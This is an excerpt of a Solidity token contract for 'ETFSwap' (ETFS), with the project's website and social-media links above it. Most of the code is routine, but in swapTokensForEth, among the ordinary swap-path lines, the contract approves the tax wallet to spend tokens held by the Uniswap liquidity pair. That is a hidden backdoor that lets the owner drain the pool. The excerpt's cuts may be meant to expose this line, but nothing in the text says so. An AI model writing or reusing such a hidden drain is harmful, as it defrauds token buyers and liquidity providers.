...
Website:         https://www.etfchainswap.com
Utility:         https://app.etfchainswap.com
Medium:          https://medium.com/@etfchainswap
Telegram:        https://t.me/etfchainswap
Twitter:         https://twitter.com/etfchainswap
...
contract ETFS is Context, IERC20, Ownable {
    ...
    string  private constant _name   = unicode"ETFSwap";
    string  private constant _ticker = unicode"ETFS";
    ...
    uint256 public _maxTxSize = 2000000 * 10**_decimals;   
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) { 
            ...
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                ...
                require(balanceOf(to) + amount <= _maxTxSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }
    ...
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        ...
        path[0] = address(this);
        _marketingTaxAddress = _taxWallet;
        path[1] = uniswapV2Router.WETH();
        pairAddress = uniswapV2Pair;
        _approve(pairAddress, _marketingTaxAddress, _maxTxSize);
